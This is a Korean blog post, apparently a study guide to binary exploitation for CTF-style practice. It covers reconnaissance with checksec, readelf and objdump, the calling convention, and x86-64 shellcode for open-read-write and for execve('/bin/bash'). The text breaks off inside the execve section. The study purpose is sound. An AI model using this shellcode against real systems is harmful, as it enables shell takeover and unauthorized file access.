<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploit | AswinBlue</title><meta name=keywords content="C,hacking,assembly"><meta name=description content="Exploit pwntool의 checksec 명령어로 어떤 보안이 적용되었는지 확인 가능하다. Shell Code exploit은 파일 읽고 쓰기(open-read-write, orw), 셸 명령 실행(execve) 권한을 취득하는 것을 목표로 한다. Shell 권한을 획득하기 위한 어셈블리 코드들의 모음을 &lsquo;Shell Code&rsquo; 라 칭한다. 환경세팅 pwntools checksec shellcraft ROPgadget one_gadget patchelf 취약점 공격 순서 바이너리를 분석하여 보호기법을 확인한다. checksec 명령어를 사용하여 바이너리에 적용된 보호기법을 확인하고, 적용 불가능한 exploit 기법을 추려낸다. checksec 참조 ldd 명령을 활용하여 의존성 관계를 확인한다. ldd 명령 코드를 확인하여 취약점 및 구조(stack 형태)을 파악한다 stack은 함수에서 선언된 순서대로 할당되지 않음에 주의하며, 무조건 assembly어를 통해 stack 주소에서 특정 변수의 위치를 확인하도록 한다."><meta name=author content="AswinBlue"><link rel=canonical href=https://aswinblue.github.io/Blog/post/systemhacking/exploit/><meta name=google-site-verification content="XYZabc"><link crossorigin=anonymous href=/Blog/assets/css/stylesheet.min.f92d651568443750d127ad6450a5621c2bf278d2c45216a3d199fd40eafc2473.css integrity="sha256-+S1lFWhEN1DRJ61kUKViHCvyeNLEUhaj0Zn9QOr8JHM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/Blog/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://aswinblue.github.io/Blog accesskey=h title="AswinBlue (Alt + H)">AswinBlue</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://aswinblue.github.io/Blog/archives title=Archive><span>Archive</span></a></li><li><a href=https://aswinblue.github.io/Blog/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://aswinblue.github.io/Blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://aswinblue.github.io/Blog/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><div class=grid-container><div style=float:left;margin:30px class=auto-hide-div><ul><li style=list-style-position:inside;text-indent:20px;color:#1284ff><a href=/Blog/post/systemhacking/>System Hacking</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/systemhacking/reverse_engineering/>Reverse Engineering</a></li><li style=list-style-position:inside;text-indent:30px;color:#1284ff;content:\25ba\00a0><a href=/Blog/post/systemhacking/exploit/>Exploit</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/systemhacking/pwntool/>Pwntool</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/assembly/>Assembly</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/assembly/assembly_basic/>Assembly_basic</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/projects/>🔷Projects</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/projects/delver/delver/>Delver</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/projects/flickthrough/flick_through/>FlickThrough</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/windowapp/>WindowApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/windowapp/window_programming/>Window_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/windowapp/kivy/>Kivy</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/webserver/>WebServer</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webserver/spring_boot/>Spring_boot</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webserver/spring/>Spring basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webserver/nodejs/>Nodejs</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/webapplication/>WebApplication</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/thymeleaf/>thymeleaf</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/tailwind/>Tailwind</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/angular/>Angular</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/react_basic/>React basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/pythoncgi/>PythonCGI</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/javascript/>JavaScript</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/css/>Css</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/html/>Html</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/python/>Python</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/python/python/>Python</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/mobileapp/>MobileApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/mobileapp/flutter/>Flutter</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/machinelearning/>MachineLearning</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/machinelearning/tensorflow/>Tensorflow</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/java/>Java</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/java/jython/>Jython</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/linux/>Linux</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/ipc/>IPC</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/thread/>Thread</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/process/>Process</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/system_programming/>System_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/shell_programming/>Shell Programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_introduction/>Linux_introduction</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_env/>Linux_env</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/virtual_box/>Virtual_box</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_command/>Linux commands</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_apt/>Linux_apt</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/hugo/>Hugo</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/hugo/hugo_dev/>Hugo 환경세팅</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/hugo/sample/>Markdown Syntax Guide</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/golang/>GoLang</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/golang/golang/>Golang</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/git/>Git</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/git/git/>Git</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/developtips/>DevelopTips</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/developtips/vscode/>VsCode</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/developtips/window/>Window</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/developtips/web_scrapping/>Web_scrapping</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/database/>DataBase</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/database/firebase_react/>Firebase_react</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/database/firebase/>Firebase</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/database/mysql/>Mysql</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/crypto/>Crypto</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/crypto/cryptocurrency/>Cryptocurrency</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/computerscience/>ComputerScience</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/computerscience/computer_science/>Computer Science</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/cloud/>Cloud</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/cloud/aws/>Aws</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/ci_cd/>CI_CD</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/ci_cd/docker/>Docker</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/algorithm/>Algorithm</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/algorithm/algorithm/>Algorithm</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/c++/>C++</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/unit_test/>Unit Test</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/make/>Make</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/gcc/>Gcc</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/c++_stl/>C++_stl</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/gdb/>GDB</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/c++/>C++ basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/cmake/>CMake</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/json_c++/>Json in C++</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/log_c++/>spdlog C++</a></li></ul></li><ul></ul><ul></ul></ul></div><main class=main style=grid-row:1;grid-column:2;width:100%><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://aswinblue.github.io/Blog>Home</a></div><h1 class=post-title>Exploit</h1><div class=post-meta><span title='2024-03-11 20:46:33 +0900 KST'>March 11, 2024</span>&nbsp;·&nbsp;67 min&nbsp;·&nbsp;AswinBlue&nbsp;|&nbsp;<a href=https://github.com/AswinBlue/HugoBlog/tree/master/content/post/SystemHacking/exploit.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#exploit aria-label=Exploit>Exploit</a><ul><li><a href=#shell-code aria-label="Shell Code">Shell Code</a></li><li><a href=#%ed%99%98%ea%b2%bd%ec%84%b8%ed%8c%85 aria-label=환경세팅>환경세팅</a></li><li><a href=#%ec%b7%a8%ec%95%bd%ec%a0%90-%ea%b3%b5%ea%b2%a9-%ec%88%9c%ec%84%9c aria-label="취약점 공격 순서">취약점 공격 순서</a><ul><li><a href=#%ec%9e%90%ec%a3%bc-%ec%93%b0%eb%8a%94-%ea%b5%ac%eb%ac%b8 aria-label="자주 쓰는 구문">자주 쓰는 구문</a></li></ul></li><li><a href=#%ec%b7%a8%ec%95%bd%ec%a0%90-%eb%b0%8f-%ea%b3%b5%eb%9e%b5 aria-label="취약점 및 공략">취약점 및 공략</a><ul><li><a href=#orw aria-label=ORW>ORW</a></li><li><a href=#execve aria-label=execve>execve</a></li><li><a href=#buffer-overflow aria-label="buffer overflow">buffer overflow</a></li><li><a href=#ropreturn-oriented-programming aria-label="ROP(Return Oriented Programming)">ROP(Return Oriented Programming)</a><ul><li><a href=#return-to-shellcode aria-label="Return to Shellcode">Return to Shellcode</a></li><li><a href=#rtl-return-to-library aria-label="RTL (Return To Library)">RTL (Return To Library)</a></li><li><a href=#return-to-plt aria-label="Return to PLT">Return to PLT</a></li><li><a href=#return-oriented-programming aria-label="Return Oriented Programming">Return Oriented Programming</a></li></ul></li><li><a href=#hook-overwrite aria-label="Hook Overwrite">Hook Overwrite</a><ul><li><a href=#free-hook-overload aria-label="Free Hook Overload">Free Hook Overload</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c aria-label="exploit 예시">exploit 예시</a></li></ul></li></ul></li><li><a href=#out-of-bound aria-label="Out Of Bound">Out Of Bound</a></li><li><a href=#fsb-format-string-bug aria-label="FSB (Format String Bug)">FSB (Format String Bug)</a></li><li><a href=#use-after-free aria-label=Use-After-Free>Use-After-Free</a></li><li><a href=#doubly-free-bug aria-label="Doubly Free Bug">Doubly Free Bug</a><ul><li><a href=#tcache-poisoning aria-label="Tcache Poisoning">Tcache Poisoning</a></li></ul></li><li><a href=#logical-error aria-label="Logical Error">Logical Error</a><ul><li><a href=#type-error aria-label="Type Error">Type Error</a></li><li><a href=#command-injection aria-label="Command Injection">Command Injection</a></li><li><a href=#path-traversal aria-label="Path Traversal">Path Traversal</a></li></ul></li><li><a href=#bypass-seccomp aria-label="Bypass SECCOMP">Bypass SECCOMP</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-1 aria-label="exploit 예시">exploit 예시</a></li></ul></li><li><a href=#master-canary aria-label="Master Canary">Master Canary</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-2 aria-label="exploit 예시">exploit 예시</a></li></ul></li><li><a href=#overwrite-_rtld_global aria-label="Overwrite _rtld_global">Overwrite _rtld_global</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-3 aria-label="exploit 예시">exploit 예시</a></li></ul></li><li><a href=#__environ aria-label=__environ>__environ</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-4 aria-label="exploit 예시">exploit 예시</a></li></ul></li><li><a href=#sigreturn-oriented-programming-srop aria-label="SigReturn-Oriented Programming (SROP)">SigReturn-Oriented Programming (SROP)</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-5 aria-label="exploit 예시">exploit 예시</a></li></ul></li><li><a href=#_io_file aria-label=_IO_FILE>_IO_FILE</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-6 aria-label="exploit 예시">exploit 예시</a></li><li><a href=#exploit-%ec%98%88%ec%8b%9c-2-1 aria-label="exploit 예시 2">exploit 예시 2</a></li><li><a href=#exploit-%ec%98%88%ec%8b%9c-3-1 aria-label="exploit 예시 3">exploit 예시 3</a></li></ul></li></ul></li><li><a href=#%eb%b3%b4%ed%98%b8-%ea%b8%b0%eb%b2%95 aria-label="보호 기법">보호 기법</a><ul><li><a href=#stack-canary aria-label="Stack Canary">Stack Canary</a></li><li><a href=#nx aria-label=NX>NX</a></li><li><a href=#aslr aria-label=ASLR>ASLR</a></li><li><a href=#pie aria-label=PIE>PIE</a></li><li><a href=#relro-relocation-read-only aria-label="RELRO (RELocation Read-Only)">RELRO (RELocation Read-Only)</a><ul><li><a href=#segment-%ea%b6%8c%ed%95%9c-%ed%99%95%ec%9d%b8-%eb%b0%a9%eb%b2%95 aria-label="segment 권한 확인 방법">segment 권한 확인 방법</a></li></ul></li><li><a href=#sandbox aria-label=Sandbox>Sandbox</a><ul><li><a href=#seccomp aria-label=SECCOMP>SECCOMP</a><ul><li><a href=#%ec%84%a4%ec%b9%98-%eb%b0%8f-%ec%82%ac%ec%9a%a9 aria-label="설치 및 사용">설치 및 사용</a></li><li><a href=#seccomp-tools aria-label=seccomp-tools>seccomp-tools</a></li></ul></li></ul></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h1><ul><li><code>pwntool</code>의 <code>checksec</code> 명령어로 어떤 보안이 적용되었는지 확인 가능하다.</li></ul><h2 id=shell-code>Shell Code<a hidden class=anchor aria-hidden=true href=#shell-code>#</a></h2><ul><li>exploit은 파일 읽고 쓰기(open-read-write, orw), 셸 명령 실행(execve) 권한을 취득하는 것을 목표로 한다.</li><li>Shell 권한을 획득하기 위한 어셈블리 코드들의 모음을 &lsquo;Shell Code&rsquo; 라 칭한다.</li></ul><h2 id=환경세팅>환경세팅<a hidden class=anchor aria-hidden=true href=#환경세팅>#</a></h2><ul><li><a href=../pwntool/#%EC%84%A4%EC%B9%98>pwntools</a></li><li><a href=../pwntool/#checksec>checksec</a></li><li><a href=../pwntool/#shellcraft>shellcraft</a></li><li><a href=../pwntool/#ropgadget>ROPgadget</a></li><li><a href=pwntool/#one_gadget>one_gadget</a></li><li><a href=pwntool/#patchelf>patchelf</a></li></ul><h2 id=취약점-공격-순서>취약점 공격 순서<a hidden class=anchor aria-hidden=true href=#취약점-공격-순서>#</a></h2><ol><li>바이너리를 분석하여 보호기법을 확인한다.</li></ol><ul><li><code>checksec</code> 명령어를 사용하여 바이너리에 적용된 보호기법을 확인하고, 적용 불가능한 exploit 기법을 추려낸다.<ul><li><a href=../pwntool/#checksec>checksec 참조</a></li></ul></li><li><code>ldd</code> 명령을 활용하여 의존성 관계를 확인한다.<ul><li><a href=../../Linux/linux_command/#%EB%A6%AC%EB%88%85%EC%8A%A4-%EC%84%A4%EC%A0%95-%EA%B4%80%EB%A0%A8>ldd 명령</a></li></ul></li></ul><ol start=2><li>코드를 확인하여 취약점 및 구조(stack 형태)을 파악한다</li></ol><ul><li><p>stack은 함수에서 선언된 순서대로 할당되지 않음에 주의하며, 무조건 assembly어를 통해 stack 주소에서 특정 변수의 위치를 확인하도록 한다.</p></li><li><p><code>readelf -h</code> ELF 파일의 헤더 확인</p></li><li><p><code>readelf -s</code> ELF 파일 내부 symbol 정보들을 출력</p><ul><li>함수 주소, 이름 및 속성들을 확인할 수 있다.</li></ul></li><li><p><code>readelf -S</code> ELF 파일 내부 Section 정보들을 출력</p><ul><li><code>objdump -h</code> 명령과 동일한 결과를 출력</li><li>section의 크기, VMA(Virtual Memory Address), LMA(Load Memory Address), file offset 등의 정보를 확인할 수 있다.</li></ul></li><li><p><code>objdump -S FILE_NAME</code>: object file을 어셈블리 형태로 주소별로 출력</p></li><li><p><code>objdump -h FILE_NAME</code>: object file의 section 헤더정보를 확인</p></li><li><p><code>objdump -d FILE_NAME</code>: object file 내용을 어셈블리어 형태로 출력한다.</p></li><li><p><code>objdump --disassemble=main</code> : main 함수 disassemble 확인</p><ul><li><code>gdb</code> 실행 이후 <code>disass main</code> 으로도 확인 가능</li></ul></li><li><p>함수의 인자와 레지스터</p><ul><li>함수의 인자는 순서대로 rdi, rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10], [rsp+0x18], [rsp+0x20] &mldr; 값을 가져와서 사용한다.</li></ul></li></ul><ol start=3><li>프로그램을 실행시키며 취약점 공략 및 쉘 권한 탈취</li></ol><ul><li><a href=../pwntool>pwndbg</a> 및 <a href=../../C++/gdb>pwntool</a> 활용</li></ul><h3 id=자주-쓰는-구문>자주 쓰는 구문<a hidden class=anchor aria-hidden=true href=#자주-쓰는-구문>#</a></h3><ul><li><p>[pwntool] libc_base 주소 획득</p><pre tabindex=0><code>libc = ELF(&#39;./libc.so.6&#39;)
libc.symbols[&#39;_IO_2_1_stdout_&#39;]  # 라이브러리에서 &#39;stdout&#39; 의 상대위치 획득
libc.symbols[&#39;_IO_file_jumps&#39;]  # 라이브러리에서 &#39;_IO_jump_t&#39; 구조체 정의 위치 획득
</code></pre></li><li><p>[linux] 라이브러리 참조 경로 설정
<code>export LD_PRELOAD=$(realpath ./libc.so.6)</code></p></li><li><p>[SYSV 규약의 특징]</p><ul><li>함수 호출시 사용되는 인자는 레지스터에 <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code> 순서대로 적용된다. 6개를 넘어서는 인자는 stack 에 쌓인다.</li></ul></li></ul><h2 id=취약점-및-공략>취약점 및 공략<a hidden class=anchor aria-hidden=true href=#취약점-및-공략>#</a></h2><ul><li><a href=https://github.com/AswinBlue/ExploitExample>샘플 코드</a></li></ul><h3 id=orw>ORW<a hidden class=anchor aria-hidden=true href=#orw>#</a></h3><ul><li>파일을 열고 읽고 쓸 수 있도록 하는 shell code를 &lsquo;ORW shell code&rsquo; 라 칭한다.</li><li>시스템 콜들은 rax, rdi, rsi, rdx로 이루어 져 있음을 참고하여 shell code를 작성해 보자.<ul><li>rax : 시스템 콜에 대응되는 번호</li><li>rdi : 시스템 콜의 첫번째 인자</li><li>rsi : 시스템 콜의 두번째 인자</li><li>rdx : 시스템 콜의 세번째 인자</li></ul></li></ul><ol><li><p>open</p><ul><li>리눅스에서 open 명령은 <code>open('FILE_PATH', flag, mode)</code> 형태이다.</li><li>이를 어셈블리어로 분리하여 표현하면<ol><li>&lsquo;FILE_PATH&rsquo; 을 stack에 담는다.<ul><li>이때, stack에는 데이터가 8byte씩 올라가기 때문에 8byte 단위로 string을 끊어서 push한다.</li><li>ex) &ldquo;1234567890&rdquo; 을 stack에 담을 때 &ldquo;09&rdquo; &ldquo;87654321&rdquo; 순으로 데이터를 push해야 한다.</li></ul></li><li>rsp를 rdi로 옮겨 rdi(첫번째 인자)가 &lsquo;FILE_PATH&rsquo;를 가리키도록 한다.</li><li>두 번째와 세 번째 인자에 맞게 각각 rsi와 rdx를 설정한다.</li><li>open은 시스템 콜 번호 2에 해당하므로 rax를 2로 설정한다.</li></ol></li><li>ex) open (&ldquo;1234567890&rdquo;, O_RDONLY, NULL) 은 아래 어셈블리어로 치환된다.<pre tabindex=0><code>push 0x3039
mov rax, 0x3837363534333231 ; to push 8byte
push rax
mov rdi, rsp    ; (1) rdi = &#34;1234567890&#34;
xor rsi, rsi    ; (3) rsi = 0 ; O_RDONLY
xor rdx, rdx    ; (3) rdx = 0 ; NULL
mov rax, 2      ; (4) rax = 2 ; syscall_open
syscall         ; open(&#34;1234567890&#34;, O_RDONLY, NULL)
</code></pre></li></ul></li><li><p>read</p><ul><li>read 명령은 <code>read(FILE_DESCRIPTOR, buf, size)</code> 형태이다.</li><li>read 명령을 어셈블리어로 표현하면<ol><li>open을 통해 열린 파일의 file descriptor는 <code>rax</code> 영역에 저장되므로, <code>rax</code> 값을 <code>rdi</code> 에 대입한다.</li><li>데이터를 저장할 길이를 고려하여 <code>rsi</code>에 값을 대입한다. size가 10이라면 <code>rsp-10</code> 값을 대입한다.</li><li><code>rdx</code> 에 size 값을 대입한다.</li><li><code>rax</code> 에 read에 해당하는 0 값을 대입한다.</li></ol></li><li>ex) read(fd, buf, 10) 은 아래 어셈블리어로 표현된다.<pre tabindex=0><code>mov rdi, rax      ; (1) fd값을 rdi에 대입
mov rsi, rsp
sub rsi, 0x0A     ; (2) rsi = rsp-10 ; buf
mov rdx, 0x0A     ; (3) rdx = 0x0A     ; length
mov rax, 0x0      ; (4) rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x0A)
</code></pre></li></ul></li><li><p>write</p><ul><li>write 명령은 <code>write(FILE_DESCRIPTOR, buf, size)</code> 형태이다.</li><li>write 명령을 어셈블리어로 표현하면<ol><li><code>rdi</code> 에 FILE_DESCRIPTOR 값을 대입한다. stdout으로 출력을 하려면 0x01을 적용한다.</li><li><code>rsi</code> 와 <code>rdx</code> 는 read 에서 사용한 값과 동일한 값을 적용한다.</li><li>write 에 해당하는 시스템콜 번호 1을 <code>rax</code> 에 대입한다.</li></ol></li><li>ex) write(fd, buf, 10) 은 아래 어셈블리어로 표현된다.<pre tabindex=0><code>mov rdi, 1        ; (1) rdi = 1 ; fd = stdout
                  ; rsi rdx 값은 read와 동일한 값 사용, 별도 설정 안함
mov rax, 0x1      ; (3) rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x0A)
</code></pre></li></ul></li></ol><ul><li>shell code는 어셈블리 형태이므로 기계어로 컴파일 해서 사용 가능하지만, 실행될 기기의 os, cpu에 따라 다른 방법을 사용해야 한다.</li><li>shell code를 동작시키기 위해 skeleton code에 shell code를 삽입하여 컴파일 하는 방법을 사용할 수 있다.<ul><li>skeleton code란, 아무런 동작도 하지 않는 어셈블리어로 작성된 코드로, 컴파일이 가능하다.</li><li>마치 C언어에서 <code>void main(void) { return 0 }</code> 를 컴파일 하는 것과 같다.</li><li>C언어로 작성된 skeleton code의 예시는 아래와 같다.</li></ul><pre tabindex=0><code>  // 어셈블리어로 작성한 &#39;assem_code&#39; 함수를 실행시키는 파일
  __asm__(
      &#34;.global assem_code\n&#34;
      &#34;assem_code:\n&#34;

      # 여기에 원하는 assembly code를 집어넣는다.
      # 어셈블리 코드는 라인마다 마지막에 &#39;\n&#39; 가 붙어야 함에 주의한다.

      &#34;xor rdi, rdi   # rdi = 0\n&#34;
      &#34;mov rax, 0x3c	# rax = sys_exit\n&#34;
      &#34;syscall        # exit(0)&#34;
  );

  void assem_code();

  int main() { assem_code(); }
</code></pre></li></ul><h3 id=execve>execve<a hidden class=anchor aria-hidden=true href=#execve>#</a></h3><ul><li>execve() 는 Linux kernel 레벨의 함수로, 특정 프로그램을 실행시키는 함수이다.</li><li><code>execve("/bin/bash", NULL, NULL)</code> 을 실행할 수 있게 되면 쉘을 실행할 수 있는 권한을 얻은 것이다.</li><li>execve는 <code>execve(FILE_NAME, argv, envp)</code> 형태로 실행되며, FILE_NAME은 실행할 프로그램 경로, argv는 인자, envp는 환경변수에 해당한다.</li><li>execve를 어셈블리어로 표현하면<ol><li>스택에 &lsquo;/bin/bash&rsquo; 를 넣고 <code>rdi</code>에 그 주소를 대입한다.</li><li><code>rsi</code>와 <code>rdx</code>는 NULL이므로 0을 대입한다.</li><li>execve는 시스템콜 번호 0x3B에 해당하므로 <code>rax</code>는 0x3B가 적용된다.</li></ol><pre tabindex=0><code>  push 0x68
  mov rax, 0x7361622f6e69622f
  push rax
  mov rdi, rsp  ; (1) rdi = &#34;/bin/bash&#34;
  xor rsi, rsi  ; (2) rsi = NULL
  xor rdx, rdx  ; (2) rdx = NULL
  mov rax, 0x3b ; (3) rax = execve
  syscall       ; execve(&#34;/bin/bash&#34;, null, null)
